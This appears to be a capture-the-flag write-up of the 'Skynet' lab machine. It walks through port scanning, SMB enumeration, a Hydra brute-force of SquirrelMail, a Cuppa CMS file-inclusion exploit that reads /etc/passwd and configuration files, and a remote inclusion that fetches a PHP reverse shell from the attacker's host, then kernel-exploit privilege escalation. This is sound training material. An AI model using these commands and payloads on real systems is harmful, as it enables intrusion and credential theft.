<h1>Skynet</h1>
<h3>Reconnaissance</h3>

As always, we start with an nmap scan:

`nmap -sC -sV <target-ip>`

`Scan Results
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp  open  http        Apache httpd 2.4.18
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu`
Identified Services
 <em><strong>
SSH
HTTP
POP3
IMAP
SMB
</strong><em>

The web server is usually the best place to begin, so we visit the site first.

<h3>Web Enumeration</h3>

Browsing the website does not immediately reveal anything useful.


We move on to directory enumeration using feroxbuster.

`feroxbuster -u http://<target-ip>`
Interesting Discovery
`http://<target-ip>/squirrelmail`

The target is running <em><strong>SquirrelMail 1.4.23.</strong><em>

After researching the version, we find a possible remote code execution vulnerability:

<em><strong>CVE-2017-7692</strong><em>

However, after testing, the exploit does not work on this target.

Time to continue enumerating.

<h3>SMB Enumeration</h3>

Next, we investigate SMB.

We use enum4linux:

`enum4linux -a <target-ip>`
SMB Shares Found
print$
anonymous
milesdyson
IPC$

The anonymous share immediately stands out.

We connect using a null session:

`smbclient //<target-ip>/anonymous -N`

Inside the share we find:

`log1.txt
log2.txt
log3.txt
attention.txt
Interesting Message`

From `attention.txt`:

<em><strong>
A recent system malfunction has caused various passwords to be changed.
All skynet employees are required to change their password after seeing this.

-Miles Dyson
</strong><em>

This strongly suggests the log files may contain passwords.

And indeed, `log1.tx`t contains a list of potential passwords.

<h3>User Enumeration</h3>

Now we need a valid username.

We use rpcclient to enumerate users:

`rpcclient -U "" <target-ip>`

Eventually we discover the user:

`milesdyson`

Perfect.

Now we can attempt password spraying/bruteforcing.

Brute Forcing SquirrelMail

Before using Hydra, we test how the login form behaves.

We intentionally submit invalid credentials:

admin%admin

The application returns:

Unknown user or password incorrect.

This gives us the failure condition needed for Hydra.

Hydra Command
`hydra <target-ip> \
-l milesdyson \
-P log1.txt \
http-post-form \
"/squirrelmail/src/login.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect."`

Eventually Hydra finds valid credentials.
We can now log into SquirrelMail as <em><strong>milesdyson</strong><em>

<h3>Accessing the Mailbox</h3>

Inside the mailbox we find an email containing a new SMB password for Miles Dyson.

Using those credentials, we reconnect to SMB:

`smbclient //<target-ip>/milesdyson -U milesdyson --password='<findityourself!>'`

Inside the share we discover a directory named:

notes

Within it is a file called:

`important.txt`

Contents:

`/45kra24zxs28v3yd`

Interesting.

<h3>Hidden Web Directory</h3>

Visiting the directory:

`http://<target-ip>/45kra24zxs28v3yd`

reveals a page with an image but nothing else useful.

We continue enumerating.

`feroxbuster -u http://<target-ip>/45kra24zxs28v3yd \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`
Discovery:
/administrator/

This reveals a Cuppa CMS administration panel.

<h3>Exploiting Cuppa CMS<\h3>

Researching the CMS reveals a known Local File Inclusion vulnerability:

https://www.exploit-db.com/exploits/25971

Testing for LFI
`http://<target-ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`

The request successfully returns /etc/passwd.

The target is vulnerable.

Extracting Configuration Files

We can use PHP filters to base64-encode sensitive files.

`/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php`

The response contains base64-encoded PHP source.

After decoding:

`<?php
class Configuration{
public $host = "localhost";
public $db = "cuppa";
public $user = "root";
public $password = "password123";
}
?>`

We try the credentials against the CMS:

`root : password123`

Unfortunately, they do not work.

<h3>Remote Code Execution</h3

The vulnerable parameter can also load remote files.

We host a PHP reverse shell locally:

`python3 -m http.server 8000`

Start a listener:

`nc -lvnp 4444`

Then trigger the exploit:

`http://<target-ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<your-ip>:8000/shell.php`

<em><strong>i tried multiple shells but the one that worked was from https://www.revshells.com/ the PHP PentestMonkey</strong><em>

Once visited, we receive a reverse shell.

<h3>Stabilizing the Shell</h3>

Upgrade the shell:

`python3 -c 'import pty; pty.spawn("/bin/sh")'`

Now we can properly enumerate the system.

<h3>Privilege Escalation</h3>

We check the kernel version:

`uname -a`

Result:

`Linux skynet 4.8.0-58-generic`

After researching the kernel version, we discover a possible privilege escalation exploit:

`CVE-2017-1000112`

Kernel Exploit Repository

Exploitation

Transfer the exploit to the target and compile it:

`gcc pwn.c -o pwn`

Execute it:

`./pwn`

And we get root.

`root@skynet:/#`
